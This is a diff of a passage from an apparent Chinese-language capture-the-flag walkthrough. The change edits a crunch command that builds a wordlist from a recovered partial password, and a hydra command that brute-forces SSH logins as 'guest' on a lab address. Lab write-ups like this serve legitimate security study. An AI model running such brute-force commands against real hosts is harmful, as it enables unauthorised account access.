@@ -45,7 +45,7 @@ cat ./下载/Cypher.matrix
 > **我们得到了密码 'k1ll0r\*\*'，虽然不完整但我们可以制作字典进行爆破**
 
 ```
-crunch 8 8 -t k1ll0r%@ -o 1.txt
+crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -t k1ll0r@@ -o 1.txt
 hydra -l guest -P ./1.txt -vV 192.168.56.107 ssh
 ```
 
